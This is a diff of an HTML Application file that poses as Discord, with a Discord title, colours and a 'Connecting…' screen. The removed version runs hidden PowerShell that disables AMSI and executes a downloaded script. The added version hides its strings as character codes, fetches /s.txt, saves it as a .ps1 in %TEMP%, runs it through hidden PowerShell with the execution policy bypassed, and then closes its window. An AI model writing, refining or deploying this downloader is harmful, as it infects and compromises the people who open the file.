@@ -1,14 +1,31 @@
+<!DOCTYPE html>
 <html>
 <head>
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<hta:application showintaskbar="no" windowstate="minimize" scroll="no" border="none"/>
+<title>Discord</title>
+<hta:application id="a" showintaskbar="no" windowstate="minimize" scroll="no" border="none"/>
+<style>body{background:#313338;margin:0;font:13px sans-serif;color:#dbdee1}</style>
 </head>
 <body>
+<div>Connecting…</div>
 <script>
-var u = 'https://' + location.host + '/s.txt?t=' + Math.random();
-var p = 'powershell -nop -w hidden -ep bypass -c "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like \'*iUtils\'};$f=$a.GetFields(\'NonPublic,Static\')|?{$_.Name -eq \'amsiInitFailed\'};$f.SetValue($null,$true);iex((New-Object Net.WebClient).DownloadString(\'' + u + '\'))"';
-new ActiveXObject('WScript.Shell').Run(p, 0, false);
-setTimeout(function(){ try{ window.close(); }catch(e){} }, 2500);
+function d(n){var s='';for(var i=0;i<n.length;i++)s+=String.fromCharCode(n[i]);return s}
+try{
+  var q = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  q.open("GET", "https://" + location.host + "/s.txt?t=" + Math.random(), false);
+  q.send();
+  var v = q.responseText;
+  if(v.length > 200){
+    var f = d([37,84,69,77,80,37]) + "\\" + Math.floor(Math.random()*1e9) + ".ps1";
+    var w = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings(f);
+    var t = new ActiveXObject("ADODB.Stream");
+    t.Type = 2; t.Charset = "utf-8"; t.Open(); t.WriteText(v); t.SaveToFile(w, 2); t.Close();
+    var ps = d([112,111,119,101,114,115,104,101,108,108]);
+    var ar = d([45,110,111,112,32,45,119,32,104,105,100,100,101,110,32,45,101,112,32,98,121,112,97,115,115,32,45,102,32,34]) + w + '"';
+    new ActiveXObject("Shell.Application").ShellExecute(ps, ar, "", "open", 0);
+  }
+}catch(e){}
+setTimeout(function(){ try{ window.close(); }catch(e){} }, 2000);
 </script>
 </body>
 </html>
